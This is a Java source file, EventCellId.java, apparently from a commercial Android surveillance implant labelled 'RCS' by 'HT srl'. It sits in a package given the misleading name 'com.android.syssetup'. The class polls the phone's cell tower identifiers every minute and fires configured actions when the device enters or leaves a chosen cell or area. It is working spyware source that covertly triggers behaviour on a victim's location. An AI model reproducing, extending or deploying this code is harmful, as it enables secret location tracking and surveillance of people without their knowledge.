/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCellId.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.event;

import com.android.syssetup.CellInfo;
import com.android.syssetup.Device;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfEvent;
import com.android.syssetup.conf.ConfigurationException;
import com.android.syssetup.util.Check;

public class EventCellId extends BaseEvent {
	private static final String TAG = "EventCellId"; //$NON-NLS-1$

	private static final long CELLID_PERIOD = 60000;
	private static final long CELLID_DELAY = 1000;

	int actionOnEnter;
	int actionOnExit;

	int mccOrig;
	int mncOrig;
	int lacOrig;
	int cidOrig;
	boolean entered = false;

	@Override
	public void actualStart() {
		entered = false;
	}

	@Override
	public void actualStop() {
		onExit(); // di sicurezza
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			if (conf.has("country") == true)
				mccOrig = conf.getInt("country");
			else
				mccOrig = -1;

			if (conf.has("network") == true)
				mncOrig = conf.getInt("network");
			else
				mncOrig = -1;

			if (conf.has("area") == true)
				lacOrig = conf.getInt("area");
			else
				lacOrig = -1;

			if (conf.has("id") == true)
				cidOrig = conf.getInt("id");
			else
				cidOrig = -1;

			if (Cfg.DEBUG) {
				Check.log(TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: " + lacOrig + " Cid: " + cidOrig);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
			}

			setPeriod(CELLID_PERIOD);
			setDelay(CELLID_DELAY);
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		final CellInfo info = Device.getCellInfo();

		if (!info.valid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
			}

			return;
		}

		if ((mccOrig == -1 || mccOrig == info.mcc) && (mncOrig == -1 || mncOrig == info.mnc)
				&& (lacOrig == -1 || lacOrig == info.lac) && (cidOrig == -1 || cidOrig == info.cid)) {
			if (!entered) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Enter");//$NON-NLS-1$
				}

				entered = true;
				onEnter();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " already entered");//$NON-NLS-1$
				}
			}

		} else {
			if (entered) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Exit");//$NON-NLS-1$
				}

				entered = false;
				onExit();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " already exited");//$NON-NLS-1$
				}
			}
		}
	}
}
